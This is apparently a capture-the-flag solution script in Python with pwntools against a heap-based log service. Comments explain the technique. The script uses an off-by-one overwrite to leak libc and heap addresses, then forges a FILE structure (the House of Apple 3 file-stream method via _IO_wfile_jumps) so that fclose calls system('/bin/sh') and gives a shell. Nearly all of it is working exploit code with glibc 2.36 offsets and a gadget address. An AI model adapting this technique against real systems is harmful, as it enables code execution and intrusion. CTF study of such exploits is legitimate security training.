import time
import socket
from pwnlib.util.packing import *
from pwn import *
import os
import sys


#Change this to the actual fnetd password used in the challenge
passw = "fnetd_password"

def read_until(s, token):
    """Reads from socket `s` until a string `token` is found in the response of the server"""
    buf = b""
    while True:
        data = s.recv(2048)
        buf += data
        if not data or token in buf:
            return buf
        
def add_command(s, size, name, content):
    """Sends a command to the server to add a log entry"""
    s.send(b"add\n")
    read_until(s, b"Size")
    s.send(size)
    read_until(s, b"name")
    s.send(name)
    read_until(s, b"content")
    s.send(content)


context.update(arch="amd64", os="linux")
#Load libc
current_dir = os.path.dirname(os.path.abspath(__file__))
libc_path = os.path.join(current_dir, "libc-2.36.so")
if not os.path.isfile(libc_path):
    raise FileNotFoundError(f"libc-2.36.so not found in {current_dir}.")
libc = ELF(libc_path, checksec=False)


#This pwn works by first exploiting the rather obvious of by one error add_note() (When entering Log name),
#which allows us to overwrite the LSB of the size of the log entry. This increases the size by up to 0xfe bytes,
#which is more than enough to overwrite the _IO_FILE structure of the log entry. (Which is located just after
#the content_buffer(which has a maximum size of 0x100) on the heap)

#As read_note() relies on the size of the log entry to read the content, we can use this to leak the libc addresses contained
#in the subsequent File struct.

#This solution is based on House of Apple 3(https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/), and more specifically the method 
#the method introduced by nobodyisnobody, VoidMercy, and UDP (https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc#3---the-fsop-way-targetting-stdout, https://github.com/nobodyisnobody/write-ups/tree/main/Hack.lu.CTF.2022/pwn/byor), who found this independently from roderick,
#but were maybe inspired by https://blog.kylebot.net/2022/10/22/angry-FSROP/ (though this is not entirely clear from the write-up). Kylebot also seems to have found this indepentently from roderick, but based on the original release date roderick seems to have been the first to publish this method.

#nobodyisnobody's method exploits the fact, that a files vtable can be overwritten
#However there are protections, to ensure that the vtable is not entirely faked (it has to lie within the _libc_IO_vtables range) (Except if foreign vtable is set appropiately, but this is kinda hard to do as it is protected by pointer_guard)
#This is why we use the _IO_wfile_jumps vtable, which is a legal table instead of the _IO_file_jumps vtable, which is the one that is used by the File struct.
#When we call fclose(fp) on the File struct, this will then eventually call "_IO_FINISH (fp);", which is a macro 
#that eventually will attempt o call _IO_file_finish(fp), from the _IO_file_jumps vtable.

#However, we changed the vtable pointer in such a fashion, that instead _IO_*w*file_underflow is called. 
#This in turn will eventually call __libio_codecvt_in (cd, &fp->_wide_data->_IO_state,
				#    fp->_IO_read_ptr, fp->_IO_read_end,
				#    &read_stop,
				#    fp->_wide_data->_IO_read_ptr,
				#    fp->_wide_data->_IO_buf_end,
				#    &fp->_wide_data->_IO_read_end);
#Where cd is fp->_codecvt
#(If flags are set coorectly, which they are in this case)
#This in turn will eventually call cd->__cd_in.step->__fct(fp->codecvt->__cd_in.step)
#If codevct->__cd_in.step(aka gs)-> __shlib_handle == NULL, NO pointer demangling of __fct is done, and the function pointer is used directly.
#See __libio_codecvt_in(...)
# {
#     ...
#     #ifdef PTR_DEMANGLE
#   if (gs->__shlib_handle != NULL)
#     PTR_DEMANGLE (fct);
# #endif
#     status = DL_CALL_FCT (fct,
#                 (gs, &codecvt->__cd_in.step_data, &from_start_copy,
#                 (const unsigned char *) from_end, NULL,
#                 &dummy, 0, 0)); #This will call the function pointer directly, without demangling
#     ...
# }

#With careful preparation of the File struct, this will result in system() being in rcx, /bin/sh in rdi+0x10 and the gadget add rdi, 0x10; jmp rcx being called, which then directly leads to a shell.
#The exact registers and with what they are filled, can be read on https://niftic.ca/posts/fsop/ under Interesting Code Paths -> __libio_codecvt_in+146
#This path is very nice, as only the file structure itself has to be modified, and no fake _wide_data structure has to be prepared (as in House of Apple 2)


host = "localhost"
port = 1337

#Take arguments
if len(sys.argv) > 2:
    host = sys.argv[1]
    port = int(sys.argv[2])

s = socket.socket()
s.connect((host, port))
start = read_until(s, b"Pass")
s.send(passw.encode() + b'\n')
response = read_until(s, b"a command")
print(response)

add_command(s, b"256\n", (b"e" * 32 + b"\xfe"), b"testtest content\n")
response = read_until(s, b"a command")


s.send(b"read\n")
response = read_until(s, b"ID")
s.send(b"0\n")
response_with_libc = read_until(s, b"a command")
libc_leak = response_with_libc.split(b"\xe1\x01")[1][6:][104:112] #Manually determined
libc_leak = int.from_bytes(libc_leak.strip(), byteorder='little')
print("libc_leak: ", hex(libc_leak))

libc_base = libc_leak - 0x1D3680 #Manually calculated from libc-2.36.so
print("libc_base: ", hex(libc_base))

heap_leak = response_with_libc.split(b"\xe1\x01")[1][6:][136:144]
#print("heap_leak: ", heap_leak)
heap_leak = int.from_bytes(heap_leak.strip(), byteorder='little')
print("heap_leak: ", hex(heap_leak))

#Set libc base address to the calculated base address
libc.address = libc_base

#Adapted from https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc
#fake_vtable = libc.sym['_IO_wfile_jumps']-0x18 #This has to be modified to work for our purposes
fake_vtable = libc.sym['_IO_wfile_jumps']+0x10 #Manually determined
file_lock = heap_leak + 0x330
#The gadget # 0x1405dc  : add rdi, 0x10 ; jmp rcx #A drop in replacement gadget for our version of libc
gadget = libc_base + 0x1405dc
fake_file_location = heap_leak + 0x250
print("fake file location: ", hex(fake_file_location))



fake = FileStructure(0)
fake.flags = 0x3b01010101010101  #Taken from nobodyisnobody's method, has to satify _flags[7:0] & 4 == 0
fake.flags = 0x0  #Taken from niftics.ca's post, zeroing the flags will also work
#_flags[7:0] & 16 == 0 as per niftic.ca's post
fake._IO_read_end=libc.sym['system']		# the function that we will call: system(), this will be in rcx and called by our gadget
fake._IO_save_base = gadget   #The gadget that will eventually be called in __libio_codecvt_in
fake._IO_write_end=u64(b'/bin/sh\x00')	# will be at *rdi+0x10
fake._lock = file_lock #Necessery so that fclose() can obtain a lock

fake._codecvt= fake_file_location + 0xb8 #Value: _IO_buf_end as per niftic.ca's post
fake._wide_data = fake_file_location + 0x3000		# _wide_data just need to points to empty zone according to nobodyisnobody
fake.vtable = fake_vtable #The vtable to _IO_wfile_jumps, shifted, so that _IO_wfile_underflow is called instead of _IO_file_finish
fake.unknown2=p64(0)*2+p64(fake_file_location+0x20)+p64(0)*3 #Not entirely sure, taken from nobodyisnoboy's solution

# print("Fake file structure:")
# print(bytes(fake))
# print("Length of fake: ", len(fake))


#Writing the 0x1e1 before the fake file structure is necessery to defeat the anti-hacking check
add_command(s, b"256\n", (b"e" * 32 + b"\xfe"), p64(0) * 33 + p64(0x1e1) + bytes(fake))

response = read_until(s, b"a command")
#print(response)


#Trigger the call to fclose(fp) in delete_note()
s.send(b"delete\n")
response = read_until(s, b"ID")
s.send(b"1\n")

#Give the server some time to spawn the shell
time.sleep(0.1)
s.send(b"get_flag\n")
response = read_until(s, b"flag")
print(response)









